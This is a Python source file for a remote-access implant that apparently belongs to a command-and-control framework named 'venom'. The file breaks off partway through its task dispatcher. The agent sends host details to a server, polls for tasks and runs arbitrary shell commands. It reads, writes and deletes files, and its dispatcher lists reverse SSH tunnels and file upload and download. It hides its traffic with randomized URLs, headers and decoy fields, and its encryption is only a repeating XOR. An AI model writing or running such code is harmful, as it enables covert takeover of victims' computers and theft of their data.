#!/usr/bin/env python3
import os
import sys
import time
import json
import signal
import subprocess
import base64
import hashlib
import socket
import platform
import getpass
import random
from urllib.request import urlopen, Request, build_opener, ProxyHandler, HTTPSHandler
from urllib.parse import urljoin
from urllib.error import URLError, HTTPError
from datetime import datetime, timezone
import ssl
import math
import secrets

# PROFILE_PATH = '../server/profiles/default.json'
PROFILE_PATH = '/Users/bobby/jul18/venom/server/profiles/default.json'

# Load profile
with open(PROFILE_PATH, 'r') as f:
    profile = json.load(f)
agent_cfg = profile['agent']
config = profile['config']

# VAR_-prefixed configuration and arrays
VAR_AES_KEY = config['aes_key']
VAR_AES_IV = config['aes_iv']
VAR_DEBUG = agent_cfg['debug']
VAR_SERVER_HOST = agent_cfg['server_host']
VAR_SERVER_PORT = agent_cfg['server_port']
VAR_SERVER_SCHEME = agent_cfg['server_scheme']
VAR_PROXY_HOST = agent_cfg['proxy_host']
VAR_PROXY_PORT = agent_cfg['proxy_port']
VAR_USE_PROXY = agent_cfg['use_proxy']

ARRAY_API_BASE_PATHS = agent_cfg['agent_api_base_paths']
ARRAY_URI_ENDPOINTS = agent_cfg['uri_endpoints']
ARRAY_DATA_FIELD_NAMES = agent_cfg['data_field_names']
ARRAY_USER_AGENTS = agent_cfg['user_agents']
ARRAY_RANDOM_HEADERS = agent_cfg['random_headers']

VAR_MIN_RANDOM_JSON_ATTRS = agent_cfg.get('min_random_json_attributes', 3)
VAR_MAX_RANDOM_JSON_ATTRS = agent_cfg.get('max_random_json_attributes', 7)

# Reconstruct ARRAY_RANDOM_JSON_ATTRIBUTES
ARRAY_RANDOM_JSON_ATTRIBUTES = []
def FUNC_create_generator(gen):
    typ = gen['type']
    if typ == 'uniform':
        minv, maxv = gen['min'], gen['max']
        rnd = gen.get('round')
        if rnd is not None:
            return lambda: round(random.uniform(minv, maxv), rnd)
        return lambda: random.uniform(minv, maxv)
    elif typ == 'randint':
        return lambda: random.randint(gen['min'], gen['max'])
    elif typ == 'choice':
        opts = gen['options']
        return lambda: random.choice(opts)
    elif typ == 'datetime_utc':
        return lambda: datetime.now(timezone.utc).isoformat()
    elif typ == 'str_randint':
        return lambda: str(random.randint(gen['min'], gen['max']))
    elif typ == 'template':
        template = gen['template']
        vars = {k: FUNC_create_generator(v) for k, v in gen.items() if k not in ['type', 'template']}
        return lambda: template.format(**{k: v() for k, v in vars.items()})
    elif typ == 'base64_random':
        min_len = gen.get('min_length', 20)
        max_len = gen.get('max_length', 50)
        min_bytes = math.ceil(min_len * 3 / 4)
        max_bytes = math.floor(max_len * 3 / 4) - 1
        max_bytes = max(min_bytes, max_bytes)
        return lambda: base64.b64encode(secrets.token_bytes(random.randint(min_bytes, max_bytes))).decode('utf-8')
    raise ValueError(f"Unknown generator type: {typ}")

for attr in agent_cfg['random_json_attributes']:
    ARRAY_RANDOM_JSON_ATTRIBUTES.append((attr['name'], FUNC_create_generator(attr['generator'])))

def FUNC_get_random_api_base_path():
    return random.choice(ARRAY_API_BASE_PATHS)

def FUNC_get_random_user_agent():
    return random.choice(ARRAY_USER_AGENTS)

def FUNC_get_ARRAY_RANDOM_HEADERS():
    VAR_headers = {}
    VAR_headers['User-Agent'] = FUNC_get_random_user_agent()
    VAR_num_headers = random.randint(3, 6)
    VAR_selected_headers = random.sample(ARRAY_RANDOM_HEADERS, VAR_num_headers)
    for VAR_header_name, VAR_header_value in VAR_selected_headers:
        VAR_headers[VAR_header_name] = VAR_header_value
    return VAR_headers

def FUNC_get_random_endpoint(original_endpoint):
    VAR_lookup_endpoint = original_endpoint.lstrip('/')
    if VAR_lookup_endpoint in ARRAY_URI_ENDPOINTS:
        VAR_endpoint = random.choice(ARRAY_URI_ENDPOINTS[VAR_lookup_endpoint])
        return f"/{VAR_endpoint}"
    else:
        return f"/{VAR_lookup_endpoint}"

def FUNC_debug_print(message):
    if VAR_DEBUG:
        VAR_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{VAR_timestamp}] {message}")

def FUNC_error_print(message):
    VAR_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{VAR_timestamp}] ERROR: {message}", file=sys.stderr)

def FUNC_get_random_data_field():
    return random.choice(ARRAY_DATA_FIELD_NAMES)

def FUNC_generate_ARRAY_RANDOM_JSON_ATTRIBUTES():
    VAR_attributes = {}
    VAR_num_attributes = random.randint(VAR_MIN_RANDOM_JSON_ATTRS, min(VAR_MAX_RANDOM_JSON_ATTRS, len(ARRAY_RANDOM_JSON_ATTRIBUTES)))
    VAR_selected_attributes = random.sample(ARRAY_RANDOM_JSON_ATTRIBUTES, VAR_num_attributes)
    for VAR_attr_name, VAR_attr_generator in VAR_selected_attributes:
        VAR_attributes[VAR_attr_name] = VAR_attr_generator()
    return VAR_attributes

class CLASS_SimpleAES:
    def __init__(self, VAR_key_b64, VAR_iv_b64):
        self.VAR_key = base64.b64decode(VAR_key_b64)
        self.VAR_iv = base64.b64decode(VAR_iv_b64)
    def FUNC__xor_bytes(self, VAR_data, VAR_key):
        VAR_result = bytearray()
        VAR_key_len = len(VAR_key)
        for i, byte in enumerate(VAR_data):
            VAR_result.append(byte ^ VAR_key[i % VAR_key_len])
        return bytes(VAR_result)
    def FUNC__pad(self, VAR_data):
        if isinstance(VAR_data, str):
            VAR_data = VAR_data.encode('utf-8')
        VAR_pad_len = 16 - (len(VAR_data) % 16)
        return VAR_data + bytes([VAR_pad_len] * VAR_pad_len)
    def FUNC__unpad(self, VAR_data):
        VAR_pad_len = VAR_data[-1]
        return VAR_data[:-VAR_pad_len]
    def FUNC_encrypt(self, VAR_plaintext):
        try:
            VAR_padded_data = self.FUNC__pad(VAR_plaintext)
            VAR_hash_key = hashlib.sha256(self.VAR_key + self.VAR_iv).digest()
            VAR_encrypted = self.FUNC__xor_bytes(VAR_padded_data, VAR_hash_key)
            return base64.b64encode(VAR_encrypted).decode('utf-8')
        except Exception as e:
            FUNC_debug_print(f"Encryption failed: {e}")
            return None
    
    def FUNC_decrypt(self, VAR_ciphertext):
        try:
            VAR_encrypted_data = base64.b64decode(VAR_ciphertext)
            VAR_hash_key = hashlib.sha256(self.VAR_key + self.VAR_iv).digest()
            VAR_decrypted = self.FUNC__xor_bytes(VAR_encrypted_data, VAR_hash_key)
            VAR_unpadded = self.FUNC__unpad(VAR_decrypted)
            return VAR_unpadded.decode('utf-8')
        except Exception as e:
            FUNC_debug_print(f"Decryption failed: {e}")
            return None
    
    def FUNC_encrypt_json(self, VAR_data):
        VAR_json_str = json.dumps(VAR_data)
        return self.FUNC_encrypt(VAR_json_str)
    
    def FUNC_decrypt_json(self, VAR_encrypted_data):
        VAR_decrypted_str = self.FUNC_decrypt(VAR_encrypted_data)
        if VAR_decrypted_str:
            try:
                return json.loads(VAR_decrypted_str)
            except json.JSONDecodeError as e:
                FUNC_debug_print(f"JSON decode failed: {e}")
        return None

class CLASS_StandaloneAgent:
    
    def __init__(self, VAR_server_url, VAR_poll_interval=30, VAR_agent_id=None):
        self.VAR_server_url = VAR_server_url.rstrip('/')
        self.VAR_poll_interval = VAR_poll_interval
        self.VAR_agent_id = VAR_agent_id
        self.VAR_running = True
        self.VAR_crypto = CLASS_SimpleAES(VAR_AES_KEY, VAR_AES_IV)
        self.VAR_use_poll_jitter = False
        self.VAR_jitter_percent = 25
        
        signal.signal(signal.SIGINT, self.FUNC_signal_handler)
        signal.signal(signal.SIGTERM, self.FUNC_signal_handler)
        
    def FUNC_signal_handler(self, signum, frame):
        self.VAR_running = False
      
    def FUNC_get_system_info(self):
        try:
            VAR_username = getpass.getuser()
            VAR_hostname = socket.gethostname()
            VAR_ip_addresses = []
            try:
                VAR_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                VAR_s.connect(("8.8.8.8", 80))
                VAR_local_ip = VAR_s.getsockname()[0]
                VAR_s.close()
                if VAR_local_ip and not VAR_local_ip.startswith('127.') and VAR_local_ip not in VAR_ip_addresses:
                    VAR_ip_addresses.append(VAR_local_ip)
            except:
                pass
            
            try:
                VAR_hostname_ips = socket.getaddrinfo(VAR_hostname, None, socket.AF_INET)
                for VAR_ip_info in VAR_hostname_ips:
                    VAR_ip = VAR_ip_info[4][0]
                    if VAR_ip and VAR_ip not in VAR_ip_addresses and not VAR_ip.startswith('127.'):
                        VAR_ip_addresses.append(VAR_ip)
            except:
                pass
            VAR_pid = os.getpid()
            VAR_os_info = f"{platform.system()} {platform.release()}"
            VAR_architecture = platform.machine()
            return {
                'username': VAR_username,
                'hostname': VAR_hostname,
                'ip_addresses': VAR_ip_addresses,
                'pid': VAR_pid,
                'os_info': VAR_os_info,
                'architecture': VAR_architecture,
                'python_version': platform.python_version(),
                'poll_interval': self.VAR_poll_interval,
                'checkin_time': datetime.now().isoformat()
            }
        except Exception as e:
            FUNC_debug_print(f"Failed to gather system info: {e}")
            return {
                'username': 'unknown',
                'hostname': 'unknown',
                'ip_addresses': ['unknown'],
                'pid': os.getpid(),
                'os_info': 'unknown',
                'architecture': 'unknown',
                'python_version': platform.python_version(),
                'poll_interval': self.VAR_poll_interval,
                'checkin_time': datetime.now().isoformat()
            }
    
    def FUNC_make_request(self, VAR_endpoint, VAR_data=None, VAR_method='POST', VAR_timeout=30):
        try:
            VAR_random_endpoint = FUNC_get_random_endpoint(VAR_endpoint)
            VAR_api_base_path = FUNC_get_random_api_base_path()
            VAR_full_endpoint = f"{VAR_api_base_path}{VAR_random_endpoint}"
            VAR_url = urljoin(self.VAR_server_url, VAR_full_endpoint)
            if VAR_data:
                VAR_encrypted_data = self.VAR_crypto.FUNC_encrypt_json(VAR_data)
                if not VAR_encrypted_data:
                    FUNC_debug_print("Failed to encrypt request data")
                    return None
                VAR_field_name = FUNC_get_random_data_field()
                VAR_request_payload = {VAR_field_name: VAR_encrypted_data}
                VAR_request_payload.update(FUNC_generate_ARRAY_RANDOM_JSON_ATTRIBUTES())
                # Sort the payload keys alphabetically
                VAR_sorted_payload = dict(sorted(VAR_request_payload.items()))
                VAR_request_data = json.dumps(VAR_sorted_payload).encode('utf-8')
                VAR_req = Request(VAR_url, data=VAR_request_data)
                VAR_req.add_header('Content-Type', 'application/json')
            else:
                VAR_req = Request(VAR_url)
            
            VAR_headers_dict = FUNC_get_ARRAY_RANDOM_HEADERS()
            for VAR_header_name, VAR_header_value in VAR_headers_dict.items():
                if VAR_header_name == 'Content-Type' and not VAR_data:
                    continue
                VAR_req.add_header(VAR_header_name, VAR_header_value)
            
            if VAR_USE_PROXY:
                VAR_proxy_url = f"{VAR_PROXY_HOST}:{VAR_PROXY_PORT}"
                VAR_proxy_handler = ProxyHandler({
                    'http': f"http://{VAR_proxy_url}",
                    'https': f"http://{VAR_proxy_url}"
                })
                
                VAR_ssl_context = ssl.create_default_context()
                VAR_ssl_context.check_hostname = False
                VAR_ssl_context.verify_mode = ssl.CERT_NONE
                
                VAR_https_handler = HTTPSHandler(context=VAR_ssl_context)
                
                VAR_opener = build_opener(VAR_proxy_handler, VAR_https_handler)
                
                with VAR_opener.open(VAR_req, timeout=VAR_timeout) as VAR_response:
                    VAR_response_data = VAR_response.read().decode('utf-8')
                    return json.loads(VAR_response_data)
            else:
                FUNC_debug_print(f"Making direct connection to: {VAR_url}")
                if self.VAR_server_url.startswith('https://'):
                    VAR_ssl_context = ssl.create_default_context()
                    VAR_ssl_context.check_hostname = False
                    VAR_ssl_context.verify_mode = ssl.CERT_NONE
                    
                    VAR_https_handler = HTTPSHandler(context=VAR_ssl_context)
                    VAR_opener = build_opener(VAR_https_handler)
                    
                    with VAR_opener.open(VAR_req, timeout=VAR_timeout) as VAR_response:
                        VAR_response_data = VAR_response.read().decode('utf-8')
                        FUNC_debug_print(f"Received response: {len(VAR_response_data)} bytes")
                        return json.loads(VAR_response_data)
                else:
                    FUNC_debug_print("Using HTTP connection")
                    with urlopen(VAR_req, timeout=VAR_timeout) as VAR_response:
                        VAR_response_data = VAR_response.read().decode('utf-8')
                        FUNC_debug_print(f"Received response: {len(VAR_response_data)} bytes")
                        return json.loads(VAR_response_data)
                
        except HTTPError as e:
            FUNC_debug_print(f"HTTP Error {e.code}: {e.reason}")
            if e.code >= 500:
                FUNC_debug_print("Server error detected - may indicate server is down")
            elif e.code == 404:
                FUNC_debug_print("Endpoint not found - may indicate configuration mismatch")
            elif e.code >= 400:
                FUNC_debug_print("Client error detected - check request format")
            return None
        except URLError as e:
            if "Connection refused" in str(e.reason):
                FUNC_debug_print("Connection refused - server may be down")
            elif "timeout" in str(e.reason).lower():
                FUNC_debug_print("Request timed out - server may be slow or unreachable")
            elif "Name or service not known" in str(e.reason):
                FUNC_debug_print("DNS resolution failed - check server URL")
            else:
                FUNC_debug_print(f"URL Error: {e.reason}")
            return None
        except socket.timeout:
            FUNC_debug_print("Socket timeout - server may be unreachable")
            return None
        except Exception as e:
            FUNC_debug_print(f"Request failed with unexpected error: {e}")
            return None
    
    def FUNC_decrypt_response(self, VAR_response_json):
        try:
            for VAR_field_name in ARRAY_DATA_FIELD_NAMES:
                if VAR_field_name in VAR_response_json:
                    return self.VAR_crypto.FUNC_decrypt_json(VAR_response_json[VAR_field_name])
            return VAR_response_json
        except Exception as e:
            return None
    
    def FUNC_checkin(self):
        try:
            if not self.VAR_agent_id:
                return False
            VAR_data = {
                'agent_id': self.VAR_agent_id
            }
            VAR_response = self.FUNC_make_request('/agent/checkin', VAR_data)
            
            if VAR_response:
                VAR_decrypted = self.FUNC_decrypt_response(VAR_response)
                if VAR_decrypted and VAR_decrypted.get('success'):
                    FUNC_debug_print("Checkin successful")
                    return True
                else:
                    FUNC_debug_print("Checkin failed: Invalid response")
            else:
                FUNC_debug_print("Checkin failed: No response")
            return False
            
        except Exception as e:
            FUNC_debug_print(f"Checkin failed: {e}")
            return False
    
    def FUNC_register(self):
        try:
            if self.VAR_agent_id and self.FUNC_checkin():
                return True
            VAR_data = {
                'system_info': self.FUNC_get_system_info()
            }
            if self.VAR_agent_id:
                VAR_data['agent_id'] = self.VAR_agent_id
            VAR_response = self.FUNC_make_request('/agent/register', VAR_data)
            if VAR_response:
                VAR_decrypted = self.FUNC_decrypt_response(VAR_response)
                if VAR_decrypted and VAR_decrypted.get('success'):
                    VAR_new_id = VAR_decrypted.get('agent_id')
                    if VAR_new_id:
                        if not self.VAR_agent_id or VAR_new_id != self.VAR_agent_id:
                            self.VAR_agent_id = VAR_new_id
                        return True
                return False
        except Exception as e:
            return False
    
    def FUNC_poll_for_tasks(self):
        try:
            VAR_data = {'agent_id': self.VAR_agent_id}
            VAR_response = self.FUNC_make_request('/agent/poll', VAR_data)
            
            if VAR_response:
                VAR_decrypted = self.FUNC_decrypt_response(VAR_response)
                if VAR_decrypted:
                    if VAR_decrypted.get('has_task'):
                        VAR_task = VAR_decrypted.get('task')
                        FUNC_debug_print(f"Received task: {VAR_task['id']} ({VAR_task['type']})")
                        return VAR_task
                    else:
                        return None
            return None
            
        except Exception as e:
            FUNC_debug_print(f"Polling failed: {e}")
            return None
    
    def FUNC_execute_shell_command(self, VAR_command):
        try:
            FUNC_debug_print(f"Executing command: {VAR_command}")
            
            VAR_process = subprocess.run(
                VAR_command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                timeout=300
            )
            
            VAR_result = {
                'stdout': VAR_process.stdout,
                'stderr': VAR_process.stderr,
                'return_code': VAR_process.returncode,
                'success': VAR_process.returncode == 0
            }
            return VAR_result
            
        except subprocess.TimeoutExpired:
            return {
                'stdout': '',
                'stderr': 'Command timed out after 5 minutes',
                'return_code': -1,
                'success': False
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': -1,
                'success': False
            }
    
    def FUNC_execute_sleep_task(self, VAR_sleep_time, VAR_jitter_percent=25):
        try:
            if VAR_sleep_time is None:
                VAR_sleep_time = 5
                
            VAR_base_time = float(VAR_sleep_time)
            VAR_jitter = float(VAR_jitter_percent) if VAR_jitter_percent is not None else 25
            
            VAR_base_time = max(VAR_base_time, 1.0)
            
            VAR_old_interval = self.VAR_poll_interval
            self.VAR_poll_interval = VAR_base_time
            return {
                'message': f'Polling interval updated to {self.VAR_poll_interval} seconds (was {VAR_old_interval} seconds)',
                'success': True
            }
        except Exception as e:
            return {
                'message': f'Sleep failed: {str(e)}',
                'success': False
            }
    
    def FUNC_execute_kill_task(self, VAR_task_id):
        try:
            result = {
                'message': 'Agent terminating as requested',
                'success': True
            }
            self.FUNC_submit_result(VAR_task_id, result, True)
            self.VAR_running = False
            return result
        except Exception as e:
            FUNC_debug_print(f"Task failed: {e}")
            result = {'error': str(e), 'success': False}
            self.FUNC_submit_result(VAR_task_id, result, False)
            return result
    
    def FUNC_execute_ls_task(self, VAR_path='.'):
        try:
            import stat
            import pwd
            import grp
            from datetime import datetime
            VAR_path = VAR_path or '.'
            if not os.path.exists(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"ls: {VAR_path}: No such file or directory",
                    'return_code': 1,
                    'success': False
                }
            def format_permissions(mode):
                perms = stat.filemode(mode)
                return perms

            def format_size(size):
                for unit in ['B', 'K', 'M', 'G']:
                    if size < 1024.0:
                        if unit == 'B':
                            return f"{size:4.0f}"
                        else:
                            return f"{size:3.1f}{unit}"
                    size /= 1024.0
                return f"{size:3.1f}T"
            
            def get_owner_group(st):
                try:
                    owner = pwd.getpwuid(st.st_uid).pw_name
                except:
                    owner = str(st.st_uid)
                try:
                    group = grp.getgrgid(st.st_gid).gr_name
                except:
                    group = str(st.st_gid)
                return owner, group
            
            if os.path.isfile(VAR_path):
                try:
                    st = os.stat(VAR_path)
                    perms = format_permissions(st.st_mode)
                    owner, group = get_owner_group(st)
                    size = format_size(st.st_size)
                    mtime = datetime.fromtimestamp(st.st_mtime).strftime('%b %d %H:%M')
                    filename = os.path.basename(VAR_path)
                    
                    output = f"{perms} {st.st_nlink:3} {owner:<8} {group:<8} {size:>6} {mtime} {filename}"
                    return {
                        'stdout': output,
                        'stderr': '',
                        'return_code': 0,
                        'success': True
                    }
                except Exception as e:
                    return {
                        'stdout': '',
                        'stderr': f"ls: {VAR_path}: {str(e)}",
                        'return_code': 1,
                        'success': False
                    }
            
            try:
                items = []
                all_files = os.listdir(VAR_path)
                all_files.sort()
                entries_to_process = ['.', '..'] + all_files
                
                for item in entries_to_process:
                    if item in ['.', '..'] and item in all_files:
                        continue
                    item_path = os.path.join(VAR_path, item)
                    try:
                        st = os.stat(item_path)
                        perms = format_permissions(st.st_mode)
                        owner, group = get_owner_group(st)
                        size = format_size(st.st_size)
                        mtime = datetime.fromtimestamp(st.st_mtime).strftime('%b %d %H:%M')
                        display_name = item
                        if stat.S_ISDIR(st.st_mode) and item not in ['.', '..']:
                            display_name += '/'
                        line = f"{perms} {st.st_nlink:3} {owner:<8} {group:<8} {size:>6} {mtime} {display_name}"
                        items.append(line)
                        
                    except (OSError, PermissionError) as e:
                        continue
                
                total_size = sum(os.path.getsize(os.path.join(VAR_path, f)) for f in all_files 
                               if os.path.exists(os.path.join(VAR_path, f)))
                total_blocks = (total_size + 511) // 512
                
                output_lines = [f"total {total_blocks}"] + items
                output = '\n'.join(output_lines)
                
                return {
                    'stdout': output,
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
                
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"ls: {VAR_path}: Permission denied",
                    'return_code': 1,
                    'success': False
                }
                
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_pwd_task(self):
        try:
            VAR_current_dir = os.getcwd()
            return {
                'stdout': VAR_current_dir,
                'stderr': '',
                'return_code': 0,
                'success': True
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_cd_task(self, VAR_path):
        try:
            if not VAR_path:
                VAR_path = os.path.expanduser('~')
            
            if not os.path.exists(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"cd: {VAR_path}: No such file or directory",
                    'return_code': 1,
                    'success': False
                }
            
            if not os.path.isdir(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"cd: {VAR_path}: Not a directory",
                    'return_code': 1,
                    'success': False
                }
            
            os.chdir(VAR_path)
            VAR_new_dir = os.getcwd()
            return {
                'stdout': f"Changed to: {VAR_new_dir}",
                'stderr': '',
                'return_code': 0,
                'success': True
            }
            
        except PermissionError:
            return {
                'stdout': '',
                'stderr': f"cd: {VAR_path}: Permission denied",
                'return_code': 1,
                'success': False
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_cat_task(self, VAR_path):
        try:
            if not VAR_path:
                return {
                    'stdout': '',
                    'stderr': 'cat: missing file argument',
                    'return_code': 1,
                    'success': False
                }
            
            if not os.path.exists(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"cat: {VAR_path}: No such file or directory",
                    'return_code': 1,
                    'success': False
                }
            
            if os.path.isdir(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"cat: {VAR_path}: Is a directory",
                    'return_code': 1,
                    'success': False
                }
            
            try:
                with open(VAR_path, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                return {
                    'stdout': content,
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"cat: {VAR_path}: Permission denied",
                    'return_code': 1,
                    'success': False
                }
                
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_mv_task(self, VAR_src, VAR_dst):
        try:
            import shutil
            
            if not VAR_src or not VAR_dst:
                return {
                    'stdout': '',
                    'stderr': 'mv: missing source or destination argument',
                    'return_code': 1,
                    'success': False
                }
            
            if not os.path.exists(VAR_src):
                return {
                    'stdout': '',
                    'stderr': f"mv: {VAR_src}: No such file or directory",
                    'return_code': 1,
                    'success': False
                }
            
            try:
                shutil.move(VAR_src, VAR_dst)
                return {
                    'stdout': f"Moved {VAR_src} to {VAR_dst}",
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"mv: Permission denied",
                    'return_code': 1,
                    'success': False
                }
            except FileExistsError:
                return {
                    'stdout': '',
                    'stderr': f"mv: {VAR_dst}: File exists",
                    'return_code': 1,
                    'success': False
                }
                
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_cp_task(self, VAR_src, VAR_dst):
        try:
            import shutil
            if not VAR_src or not VAR_dst:
                return {
                    'stdout': '',
                    'stderr': 'cp: missing source or destination argument',
                    'return_code': 1,
                    'success': False
                }
            if not os.path.exists(VAR_src):
                return {
                    'stdout': '',
                    'stderr': f"cp: {VAR_src}: No such file or directory",
                    'return_code': 1,
                    'success': False
                }
            try:
                if os.path.isdir(VAR_src):
                    shutil.copytree(VAR_src, VAR_dst)
                else:
                    shutil.copy2(VAR_src, VAR_dst)
                return {
                    'stdout': f"Copied {VAR_src} to {VAR_dst}",
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"cp: Permission denied",
                    'return_code': 1,
                    'success': False
                }
            except FileExistsError:
                return {
                    'stdout': '',
                    'stderr': f"cp: {VAR_dst}: Directory not empty",
                    'return_code': 1,
                    'success': False
                }
                
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_mkdir_task(self, VAR_path):
        try:
            if not VAR_path:
                return {
                    'stdout': '',
                    'stderr': 'mkdir: missing directory argument',
                    'return_code': 1,
                    'success': False
                }
            
            if os.path.exists(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"mkdir: {VAR_path}: File exists",
                    'return_code': 1,
                    'success': False
                }
            
            try:
                os.makedirs(VAR_path, exist_ok=False)
                return {
                    'stdout': f"Created directory: {VAR_path}",
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"mkdir: {VAR_path}: Permission denied",
                    'return_code': 1,
                    'success': False
                }
                
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_rmdir_task(self, VAR_path):
        try:
            if not VAR_path:
                return {
                    'stdout': '',
                    'stderr': 'rmdir: missing directory argument',
                    'return_code': 1,
                    'success': False
                }
            
            if not os.path.exists(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"rmdir: {VAR_path}: No such file or directory",
                    'return_code': 1,
                    'success': False
                }
            
            if not os.path.isdir(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"rmdir: {VAR_path}: Not a directory",
                    'return_code': 1,
                    'success': False
                }
            
            try:
                os.rmdir(VAR_path)
                return {
                    'stdout': f"Removed directory: {VAR_path}",
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"rmdir: {VAR_path}: Permission denied",
                    'return_code': 1,
                    'success': False
                }
            except OSError as e:
                if "Directory not empty" in str(e):
                    return {
                        'stdout': '',
                        'stderr': f"rmdir: {VAR_path}: Directory not empty",
                        'return_code': 1,
                        'success': False
                    }
                else:
                    return {
                        'stdout': '',
                        'stderr': f"rmdir: {VAR_path}: {str(e)}",
                        'return_code': 1,
                        'success': False
                    }
                
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }

    def FUNC_execute_rm_task(self, VAR_path):
        try:
            if not VAR_path:
                return {
                    'stdout': '',
                    'stderr': 'rm: missing file argument',
                    'return_code': 1,
                    'success': False
                }

            if VAR_path.startswith('~'):
                VAR_path = os.path.expanduser(VAR_path)
            VAR_path = os.path.abspath(VAR_path)

            if not os.path.exists(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"rm: {VAR_path}: No such file or directory",
                    'return_code': 1,
                    'success': False
                }

            if os.path.isdir(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f"rm: {VAR_path}: Is a directory",
                    'return_code': 1,
                    'success': False
                }

            try:
                os.remove(VAR_path)
                return {
                    'stdout': f"Removed file: {VAR_path}",
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"rm: {VAR_path}: Permission denied",
                    'return_code': 1,
                    'success': False
                }
            except Exception as e:
                return {
                    'stdout': '',
                    'stderr': f"rm: {VAR_path}: {str(e)}",
                    'return_code': 1,
                    'success': False
                }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_task(self, VAR_task):
        VAR_task_type = VAR_task.get('type')
        VAR_task_id = VAR_task.get('id')
        try:
            if VAR_task_type == 'shell':
                VAR_command = VAR_task.get('command')
                if not VAR_command:
                    return {'error': 'No command specified', 'success': False}
                result = self.FUNC_execute_shell_command(VAR_command)
                
            elif VAR_task_type == 'sleep':
                VAR_sleep_time = VAR_task.get('sleep_time', 20)
                VAR_jitter_percent = VAR_task.get('jitter_percent', 25)
                result = self.FUNC_execute_sleep_task(VAR_sleep_time, VAR_jitter_percent)
                
            elif VAR_task_type == 'kill':
                result = self.FUNC_execute_kill_task(VAR_task_id)
                return result
                
            elif VAR_task_type == 'ls':
                VAR_path = VAR_task.get('path', '.')
                result = self.FUNC_execute_ls_task(VAR_path)
                
            elif VAR_task_type == 'pwd':
                result = self.FUNC_execute_pwd_task()
                
            elif VAR_task_type == 'cd':
                VAR_path = VAR_task.get('path')
                result = self.FUNC_execute_cd_task(VAR_path)
                
            elif VAR_task_type == 'cat':
                VAR_path = VAR_task.get('path')
                result = self.FUNC_execute_cat_task(VAR_path)
                
            elif VAR_task_type == 'mv':
                VAR_src = VAR_task.get('src')
                VAR_dst = VAR_task.get('dst')
                result = self.FUNC_execute_mv_task(VAR_src, VAR_dst)
                
            elif VAR_task_type == 'cp':
                VAR_src = VAR_task.get('src')
                VAR_dst = VAR_task.get('dst')
                result = self.FUNC_execute_cp_task(VAR_src, VAR_dst)
                
            elif VAR_task_type == 'mkdir':
                VAR_path = VAR_task.get('path')
                result = self.FUNC_execute_mkdir_task(VAR_path)
                
            elif VAR_task_type == 'rmdir':
                VAR_path = VAR_task.get('path')
                result = self.FUNC_execute_rmdir_task(VAR_path)
                
            elif VAR_task_type == 'write':
                VAR_path = VAR_task.get('path')
                VAR_content = VAR_task.get('content', '')
                result = self.FUNC_execute_write_task(VAR_path, VAR_content)
                
            elif VAR_task_type == 'chmod':
                VAR_mode = VAR_task.get('mode')
                VAR_path = VAR_task.get('path')
                result = self.FUNC_execute_chmod_task(VAR_mode, VAR_path)
                
            elif VAR_task_type == 'rm':
                VAR_path = VAR_task.get('path')
                result = self.FUNC_execute_rm_task(VAR_path)
                
            elif VAR_task_type == 'sshrev':
                VAR_key_path = VAR_task.get('key_path')
                VAR_port = VAR_task.get('port')
                VAR_user = VAR_task.get('user')
                VAR_domain = VAR_task.get('domain')
                if not any([VAR_key_path, VAR_port, VAR_user, VAR_domain]):
                    result = {
                        'stdout': '',
                        'stderr': 'Server error - missing task parameters. Server may need to be updated.',
                        'return_code': 1,
                        'success': False
                    }
                else:
                    result = self.FUNC_execute_sshrev_task(VAR_key_path, VAR_port, VAR_user, VAR_domain)
                    
            elif VAR_task_type == 'upload':
                VAR_remote_path = VAR_task.get('remote_path')
                VAR_file_data = VAR_task.get('file_data')
                result = self.FUNC_execute_upload_task(VAR_remote_path, VAR_file_data)
                
            elif VAR_task_type == 'download':
